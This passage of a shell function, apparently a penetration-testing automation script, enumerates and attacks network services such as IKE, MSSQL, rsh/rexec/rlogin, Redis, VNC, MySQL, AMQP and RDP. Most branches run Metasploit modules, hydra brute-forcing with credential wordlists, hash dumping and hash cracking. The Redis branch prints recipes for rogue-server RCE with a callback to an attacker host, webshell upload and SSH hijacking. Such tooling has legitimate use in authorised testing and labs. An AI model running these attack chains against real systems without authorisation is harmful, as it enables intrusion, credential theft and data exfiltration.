        read -r grp\?"DO YOU WANT TO BRUTEFORCE GROUP IDS WITH IKE-SCAN METHOD? (Y/N)"
        if [[ $grp =~ [Yy] ]]; then
            echo -e "\nBRUTEFORCING VIA IKE-SCAN\n"
            while read -r line; do (echo "Found ID: $line" && sudo ike-scan -d $3 -M -A -n $line $2) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < ~/WORDLISTS/ike-custom.txt
        fi

        read -r ike_id\?"INPUT A VALID IKE-ID (BLANK TO SKIP): "
        if [[ ! -z $ike_id ]]; then
            echo -e "\nGRABBING AND CRACKING HASH\n"
            ike-scan -M -A -n $ike_id --pskcrack=$2_hash.txt $2
            psk-crack -d /usr/share/wordlists/weakpass_4.txt $2_hash.txt    

            read -r ike_psw\?"INPUT FOUND PSK PASSWORD: "
            if [[ ! -z $ike_psw ]]; then
                echo -e "\nINITIATING STRONG-SWAN CONNECTION\n"
                chnic

                echo "$ip $2 : PSK \"$ike_psw\"" | sudo tee --append /etc/ipsec.secrets
                echo "conn host_$2\n\tauthby=secret\n\tauto=add\n\tkeyexchange=ikev1\n\tike=3des-sha1-modp1024!\n\tleft=$ip\n\tright=$2\n\ttype=transport\n\tesp=3des-sha1!\n\trightprotoport=tcp" | sudo tee --append /etc/ipsec.conf

                sudo ipsec stop
                sudo ipsec start
                sudo ipsec up host_$2
            fi
        fi
    fi

    if [[ $1 == "rtsp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "rtsp-* and not brute" -p$3 $2
    fi


    if [[ $1 == "rsync" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script "rsync-* and not brute" -p$3 $2

        echo -e "\nATTEMPTING NULL SHARES LISTING\n"
        rsync -av --list-only rsync://$2:$3

        echo "" && while true; do read -r shr\?"INPUT SHARE NAME TO DOWNLOAD (CTRL-C IF NONE): " && echo -e "\nDOWNLOADING \"$shr\" IN \"$2_$shr\"\n" && rsync -av rsync://$2:$3/$shr ./$2_$shr; done
    fi

    if [[ $1 == "mssql" ]]; then
        echo -e "\nENUMERATION + DEFAULT SA LOGIN\n"
        sudo nmap -n -Pn  -v -sV --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=$3,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -p$3 $2

        echo -e "\nMSF FINGERPRINTING\n"
        msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RPORT $3; set RHOSTS $2; exploit; exit"

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt $1://$2:$3
        fi

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)
            read -r dom\?"INPUT INSTANCE NAME: "

            echo -e "\nATTEMPTING WINDOWS AUTHENTICATION\n"
            mssqlclient.py "$dom/$usr:$psw@$2" -windows-auth
        fi
    fi

    if [[ $1 == "rsh" ]]; then
        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nBRUTEFORCING VALID USERS (XATO-TOP-1000)\n"
            hydra -L /usr/share/seclists/Usernames/xato_top_1000_custom.txt rsh://$2:$3 -v -V

            echo -e "\nMSF BRUTEFORCING (XATO-TOP-1000 / PROBABLE V2)\n"
            msfconsole -q -x "use auxiliary/scanner/rservices/rsh_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set BLANK_PASSWORDS true; set USER_FILE /usr/share/seclists/Usernames/xato_top_1000_custom.txt; set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top1575.txt; set RPORT $3; set RHOSTS $2; exploit; exit"
        fi
    fi

    if [[ $1 == "dhcp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sCV --script="broadcast-dhcp* or dhcp-*" -p$3 $2
    fi

    if [[ $1 == "rexec" ]]; then
        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nHYDRA BRUTEFORCING (XATO-NET / PROBABLE V2)\n"
            hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt rexec://$2:$3 -v -V

            echo -e "\nMSF BRUTEFORCING (PROBABLE V2)\n"
            msfconsole -q -x "use auxiliary/scanner/rservices/rexec_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set BLANK_PASSWORDS true; set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top1575.txt; set RPORT $3; set RHOSTS $2; exploit; exit"
        fi
    fi

    if [[ $1 == "rlogin" ]]; then
        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nHYDRA BRUTEFORCING (XATO-NET / PROBABLE V2)\n"
            hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt rlogin://$2:$3 -v -V

            echo -e "\nMSF BRUTEFORCING (PROBABLE V2)\n"
            msfconsole -q -x "use auxiliary/scanner/rservices/rlogin_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set BLANK_PASSWORDS true; set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top1575.txt; set RPORT $3; set RHOSTS $2; exploit; exit"
        fi
    fi

    if [[ $1 == "tns" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script "oracle-tns-version" -p$3 $2

        echo -e "\nODAT TESTING\n"
        odat all -s $2 -p $3

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)
            read -r db\?"INPUT DATABASE NAME: "

            echo -e "\nATTEMPTING SYSDBA AUTHENTICATION\n"  
            sqlplus "$usr/$psw@$2/$db" as sysdba
        fi
    fi

    if [[ $1 == "ajp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script="ajp-* and not brute" -p$3 $2
    fi

    if [[ $1 == "memcache" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn  -v -sV --script=memcached-info -p$3 $2

        echo -e "\nMSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/memcached/memcached_amp; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/memcached/memcached_udp_version; set RPORT $3; set RHOSTS $2; exploit; exit"

        echo -e "\nFETCHING ITEMS\n"
        memcdump --servers=$2

        while true; do read -r item\?"INPUT ITEM NAME TO READ: " && memccat --servers=$2 $item; done
    fi

    if [[ $1 == "redis" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script "redis-* and not brute" -p$3 $2
        
        echo -e "\nAUTHENTICATION -> redis-cli -h $2 -p $3 -> \"info\""
        echo -e "\nDB DUMPING -> \"INFO keyspace\" -> SELECT {NUM} -> KEYS * -> DUMP {KEY}"
        echo -e "\nRCE <= 5.0.5 -> \"redis-rogue-server.py --rhost $2 --rport $3 --lhost {KALI_IP}\""
        echo -e "\nWEBSHELL UPLOAD -> \"config set dir {WEB_ROOT} -> config set dbfilename {SHELL.php} -> set test {SHELL_PAYLOAD} -> save\""
        echo -e "\nSSH HIJACKING -> \"~/TOOLS/Redis-Server-Exploit/redis.py\""
        echo -e "\nMANUAL MODULE RCE -> \"https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\""
    fi


    if [[ $1 == "vnc" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p$3 $2

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt vnc://$2:$3
        fi

        read -r psw\?"INPUT VALID PASSWORD IF FOUND: "
        if [[ ! -z $psw ]]; then
            echo -e "\nATTEMPTING CONNECTION\n"
            echo $psw > /tmp/$2_VNCPASS.txt
            vncviewer -passwd /tmp/$2_VNCPASS.txt $2::$3
        fi 
    fi

    if [[ $1 == "squid" ]]; then
        echo -e "\nCHECKING IF PIVOTING IS POSSIBLE\n"
        python3 ~/TOOLS/spose/spose.py --proxy "http://$2:$3" --target "$2"

        read -r conf\?"DO YOU WANT TO ADD THE PROXYCHAINS ENTRY? (Y/N): "
        if [[ $conf =~ [Yy] ]]; then
            flg=""
            read -r creds\?"INPUT \"USER:PASS\" COMBO IF AUTHENTICATION IS NEEDED: "
            if [[ ! -z $creds ]]; then
                flg=" $(echo $creds | cut -d":" -f1) $(echo $creds | cut -d":" -f2)"
            fi

            echo -e "\nADDING PROXY\n"
            echo "http $2 $3$flg" | sudo tee --append /etc/proxychains.conf

            echo -e "\nTESTING CONNECT SCAN (TOP 100 PORTS)\n"
            sudo proxychains nmap -sT -n --top-ports 100 127.0.0.1
        fi
    fi

    if [[ $1 == "mysql" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="mysql-* and not brute" -p$3 $2

        echo -e "\nMSF UNAUTHENTICATED HASH DUMP CHECK\n"
        msfconsole -q -x "use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RPORT $3; set RHOSTS $2; exploit; exit"

        read -r brute\?"ATTEMPT DEFAULT CREDENTIALS / USER ENUMERATION? (Y/N): "
        if [[ $brute =~ [Yy] ]]; then
            echo -e "\nTESTING DEFAULT CREDENTIALS\n"
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$2:$3
        fi

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): " 
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING HASH DUMP\n"
            msfconsole -q -x "use auxiliary/scanner/mysql/mysql_hashdump; set USERNAME $usr; SET PASSWORD $psw; set RPORT $3; set RHOSTS $2; exploit; exit"

            echo -e "\nATTEMPTING LOGIN WITH \"$creds\"\n"
            mysql --skip-ssl --host=$2 --port=$3 --user="$usr" --password="$psw"
        fi
    fi

    if [[ $1 == "amqp" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="amqp-info" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/amqp/amqp_version; set RPORT $3; set RHOSTS $2; exploit; exit"
    
        echo -e "\nCHECKING GUEST AUTHENTICATION\n"
        curl -kIL http://$2:$3/api/connections -u guest:guest

        read -r cred\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $cred ]]; then
            echo -e "\nFETCHING API CONNECTIONS\n"
            curl -kIL http://$2:$3/api/connections -u "$cred"
        fi

        read -r amqp_hash\?"INPUT B64 AMQP HASH IF FOUND: "
        if [[ ! -z $amqp_hash ]]; then
            echo $amqp_hash | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > /tmp/$2_AMQP.txt
            hashcat -m 1420 --hex-salt /tmp/$2_AMQP.txt /usr/share/wordlists/weakpass_4.txt
        fi
    fi

    if [[ $1 == "mongodb" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -pn -v -sV --script="mongodb-* and not brute" -p$3 $2

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING LOGIN\n"
            mongo -u $usr -p $psw --port $3 $2
        fi
    fi

    if [[ $1 == "glusterfs" ]]; then
        echo -e "\nLISTING AVAILABLE VOLUMES\n"
        sudo gluster --remote-host=$2:$3 volume list

        read -r glust\?"INPUT VOLUME TO MOUNT: "
        echo -e "\nMOUNTING VOLUME \"$glust\"\n"
        sudo mkdir /mnt/$glust && sudo mount -t glusterfs $2:$3/$glust /mnt/$glust && cd /mnt/$glust
    fi

    if [[ $1 == "rdp" ]]; then
        echo -e "\nENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="rdp-* and not brute" -p$3 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $3; set RHOSTS $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; set RPORT $3; set RHOSTS $2; exploit; exit"

        read -r creds\?"INPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING LOGIN\n"
            xfreerdp /u:$usr /p:"$psw" /v:$2 /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
        fi

        echo -e "\nATTEMPTING BLIND LOGIN\n"
        xfreerdp /v:$2 /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
    fi

    if [[ $1 == "svn" ]]; then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -v -sV --script="http-svn-* or svn-brute" -p$3 $2

        echo -e "\nREPOSITORY LISTINGS\n"
        svn ls svn://$2:$3

        echo -e "\nFETCHING COMMIT HISTORY\n"
        svn log svn://$2:$3

        echo -e "\nDOWNLOADING REPOSITORY\n"
        mkdir /tmp/$2_SVN && cd /tmp/$2_SVN && svn checkout svn://$2:$3

        echo -e "\nTO CHANGE REVISION -> \"svn up -r {NUMBER}\"\n"
    fi
}
